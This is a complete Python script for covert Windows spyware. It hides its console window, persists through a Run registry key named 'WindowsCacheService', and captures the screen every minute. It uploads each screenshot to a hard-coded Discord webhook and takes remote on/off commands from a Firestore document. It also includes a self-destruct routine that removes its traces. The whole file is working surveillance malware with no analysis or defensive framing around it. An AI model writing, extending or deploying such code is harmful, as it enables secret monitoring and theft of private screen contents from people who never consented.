import os
import sys
import io
import time
import ctypes
import base64
import struct
import json
import socket
import urllib.request
import urllib.error
import subprocess
import winreg
try:
    console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if console_hwnd:
        ctypes.windll.user32.ShowWindow(console_hwnd, 0)
except Exception:
    pass
WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
INTERVAL = 60
MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP_REG_NAME = "WindowsCacheService"
FIRESTORE_STATUS_URL = (
    "https://firestore.googleapis.com/v1/projects/"
    "database-c7f56/databases/(default)/documents/users/app"
)
COMPUTER_NAME = socket.gethostname().upper()
TARGET_NAME = "SK5X08-PC"
try:
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)
except Exception:
    pass
def find_pythonw():
    try:
        result = subprocess.run(["where", "pythonw"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5, text=True)
        if result.returncode == 0:
            for line in result.stdout.strip().split("\n"):
                p = line.strip()
                if os.path.isfile(p):
                    return p
    except:
        pass
    return sys.executable
def fetch_firebase_field(field_name, default="on"):
    try:
        req = urllib.request.Request(FIRESTORE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=6) as response:
            data = json.loads(response.read().decode())
            return data.get("fields", {}).get(field_name, {}).get("stringValue", default)
    except Exception:
        return default
def self_destruct():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, STARTUP_REG_NAME)
        except:
            pass
        winreg.CloseKey(key)
    except:
        pass
    try:
        script_path = os.path.abspath(sys.argv[0])
        ctypes.windll.kernel32.SetFileAttributesW(script_path, 128)
        subprocess.Popen(
            f'cmd /c timeout /t 2 /nobreak > nul & del "{script_path}"',
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except:
        pass
    sys.exit(0)
def ensure_persistence():
    try:
        script_path = os.path.abspath(sys.argv[0])
        pythonw = find_pythonw()
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ,
                          f'"{pythonw}" "{script_path}"')
        winreg.CloseKey(key)
        return True
    except Exception:
        return False
def should_send_screenshot():
    try:
        all_status = fetch_firebase_field("all", "on").lower()
        owner_status = fetch_firebase_field("owner", "off").lower()
    except:
        all_status = "on"
        owner_status = "off"
    if COMPUTER_NAME == TARGET_NAME:
        if owner_status == "off":
            self_destruct()
            return False
        else:
            return True
    return all_status == "on"
def take_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        buf = io.BytesIO()
        screenshot.save(buf, format="PNG")
        buf.seek(0)
        return buf
    except ImportError:
        pass
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        hdc_screen = user32.GetDC(None)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
        gdi32.SelectObject(hdc_mem, hbmp)
        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)
        bmp_header_size = 54
        dib_header_size = 40
        stride = ((width * 3 + 3) // 4) * 4
        image_size = stride * height
        bmp_data = b"BM" + struct.pack("<I", bmp_header_size + dib_header_size + image_size)
        bmp_data += struct.pack("<HH", 0, 0)
        bmp_data += struct.pack("<I", bmp_header_size + dib_header_size)
        bmp_data += struct.pack("<I", dib_header_size)
        bmp_data += struct.pack("<i", width)
        bmp_data += struct.pack("<i", height)
        bmp_data += struct.pack("<HH", 1, 24)
        bmp_data += struct.pack("<I", 0)
        bmp_data += struct.pack("<I", image_size)
        bmp_data += struct.pack("<ii", 0, 0)
        bmp_data += struct.pack("<II", 0, 0)
        buf = ctypes.create_string_buffer(image_size)
        gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf,
                        ctypes.byref(ctypes.create_string_buffer(dib_header_size + 40)), 0)
        bmp_data += buf.raw
        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(None, hdc_screen)
        return io.BytesIO(bmp_data)
    except Exception:
        return None
def send_screenshot_to_discord(image_buffer):
    try:
        boundary = "----WebhookBoundary" + base64.b64encode(os.urandom(12)).decode()
        body_parts = [
            f"--{boundary}".encode(),
            b'Content-Disposition: form-data; name="file"; filename="screen.png"',
            b"Content-Type: image/png",
            b"",
            image_buffer.getvalue(),
            f"--{boundary}--".encode(),
        ]
        body = b"\r\n".join(body_parts)
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status == 200
    except Exception:
        return False
def main_loop():
    ensure_persistence()
    while True:
        try:
            if should_send_screenshot():
                img_buffer = take_screenshot()
                if img_buffer:
                    send_screenshot_to_discord(img_buffer)
        except Exception:
            pass
        time.sleep(INTERVAL)
if __name__ == "__main__":
    try:
        main_loop()
    except Exception:
        sys.exit(1)
